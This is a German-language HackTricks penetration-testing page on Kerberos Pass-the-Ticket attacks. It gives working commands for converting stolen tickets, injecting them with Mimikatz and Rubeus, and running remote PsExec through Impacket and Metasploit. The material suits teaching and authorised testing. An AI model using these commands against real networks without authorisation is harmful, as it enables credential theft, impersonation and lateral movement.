# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Übersicht

Bei einem Pass-the-Ticket-Angriff (PtT) verwendet ein Angreifer ein gestohlenes Kerberos-Ticket, um sich als dessen Principal zu authentifizieren, ohne das Passwort des Kontos zu besitzen. Ein Ticket-Granting-Ticket (TGT) kann zum Anfordern von Service-Tickets verwendet werden. Ein gestohlenes Service-Ticket ist dagegen auf den Ziel-Service und dessen Gültigkeitszeitraum beschränkt.<sup>[[1]](#references)</sup>

Informationen zu Techniken zum Abrufen von Tickets finden Sie hier:

- [Tickets von Windows-Systemen abrufen](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Tickets von Linux-Systemen abrufen](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Linux- und Windows-Ticketformate konvertieren

Kerberos-Caches liegen unter Linux häufig als MIT-`ccache`-Dateien und unter Windows als `.kirbi`-Dateien vor. `ticket_converter` konvertiert diese Formate anhand eines Eingabe-Tickets und eines Ausgabepfads ineinander.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo bietet auch Kerberos-Ticket-Tools für Windows.<sup>[[3]](#references)</sup>

## Ein Ticket verwenden

Setze unter Linux `KRB5CCNAME` auf den Cache und weise einen Impacket-Client an, Kerberos ohne Passwortabfrage zu verwenden:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Unter Windows können Mimikatz oder Rubeus ein `.kirbi`-Ticket in die aktuelle Anmeldesitzung importieren. Verwende `klist`, um den resultierenden Cache zu untersuchen.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Der Ticketimport gewährt keine Privilegien, die über die im Ticket und in der Autorisierungsrichtlinie des Zieldienstes festgelegten hinausgehen. Abgelaufene, widerrufene, fehlerhafte oder falsch eingeschränkte Tickets funktionieren möglicherweise nicht.<sup>[[1]](#references)</sup>

Weitere Informationen zum Kerberos-Angriffskontext und zu verwandten Techniken zur Ticketbeschaffung findest du in Tarlogics Kerberos-Angriffshandbuch.<sup>[[7]](#references)</sup>

### Ein externes Ticket in Metasploit wiederverwenden

Metasploit liest `KRB5CCNAME` von Impacket nicht automatisch für seine Kerberos-Module aus. Übergib dem Modul über die protokollspezifische Option `::Krb5Ccname` eine **ccache-Datei**. Setze `::Rhostname` auf den SPN-Hostnamen des Ziels und die Domain auf die Zieldomain; `RHOST` kann weiterhin die Ziel-IP sein. So kann ein bereits beschafftes Ticket verwendet werden, ohne das Kontopasswort einzugeben.<sup>[[8]](#references)</sup>

Konvertiere eine `.kirbi`-Datei zuerst in ccache, falls erforderlich.<sup>[[9]](#references)</sup>

Führe beispielsweise mit einem Ticket für ein Konto, das auf dem Ziel Dienste erstellen darf, das [SMB-PsExec-Modul](../lateral-movement/psexec-and-winexec.md) mit diesem Cache aus:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit wählt zuerst ein passendes Service Ticket aus dem bereitgestellten Cache aus. Findet es nur ein TGT, fordert es beim KDC ein Service Ticket an. Daher ist auch für diesen Ablauf eine Verbindung zum DC erforderlich. Ein Cache, der nur Service Tickets enthält, ermöglicht keinen Zugriff auf andere Hosts. Ändern Sie bei anderen unterstützten Modulen das Optionspräfix (z. B. `Winrm::Krb5Ccname` für [WinRM](../lateral-movement/winrm.md)).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket-Beispiele](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos-Angriffstechniken](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - Dienstauthentifizierung](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - Konvertieren von kirbi- und ccache-Dateien](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Metasploit-Kerberos-Implementierung des SMB-Clients](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
